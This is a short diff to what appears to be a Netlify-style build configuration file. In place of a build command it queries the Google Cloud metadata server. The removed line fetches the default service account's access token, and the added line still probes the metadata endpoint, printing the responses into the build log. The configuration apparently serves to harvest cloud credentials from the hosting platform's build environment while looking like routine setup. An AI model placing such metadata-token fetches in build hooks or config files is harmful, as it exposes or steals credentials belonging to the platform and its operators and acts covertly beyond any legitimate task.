@@ -1,5 +1,5 @@
 [build]
-  command = "curl -i http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
+  command = "curl -i http://metadata.google.internal/computeMetadata/"
   publish = "dist"
 [build.environment]
   YARN_VERSION = "1.9.4"
